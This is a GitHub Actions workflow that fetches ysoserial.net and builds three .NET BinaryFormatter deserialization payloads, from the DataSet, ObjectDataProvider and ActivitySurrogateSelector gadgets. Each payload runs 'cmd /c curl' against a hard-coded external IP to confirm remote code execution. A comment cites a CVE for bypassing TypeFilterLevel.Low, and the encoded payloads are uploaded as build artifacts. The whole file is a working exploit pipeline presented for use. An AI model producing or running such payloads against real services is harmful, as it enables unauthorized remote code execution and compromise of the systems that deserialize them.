name: Generate XAML WebClient payload
on: [push]
jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Download ysoserial.net
        run: |
          $url = "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip"
          Invoke-WebRequest $url -OutFile ysoserial.zip
          Expand-Archive ysoserial.zip -DestinationPath yso
      - name: Generate payloads
        run: |
          $exe = Get-ChildItem -Recurse -Filter ysoserial.exe | Select-Object -First 1

          # DataTable + WebClient XAML - bypasses TypeFilterLevel.Low per CVE-2025-11367
          & $exe.FullName -g DataSet -f BinaryFormatter `
            -c 'http://167.172.142.69:8080/pwned' `
            -o base64 | Out-File payload_dataset.b64 -Encoding ascii

          # ObjectDataProvider XAML with WebClient DownloadString
          & $exe.FullName -g ObjectDataProvider -f BinaryFormatter `
            -c 'cmd /c curl http://167.172.142.69:8080/pwned' `
            -o base64 | Out-File payload_odp.b64 -Encoding ascii

          # Also try ActivitySurrogateSelectorFromFile
          & $exe.FullName -g ActivitySurrogateSelector -f BinaryFormatter `
            -c 'cmd /c curl http://167.172.142.69:8080/pwned' `
            -o base64 2>$null | Out-File payload_ass.b64 -Encoding ascii

          dir *.b64
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: xaml-payloads
          path: "*.b64"
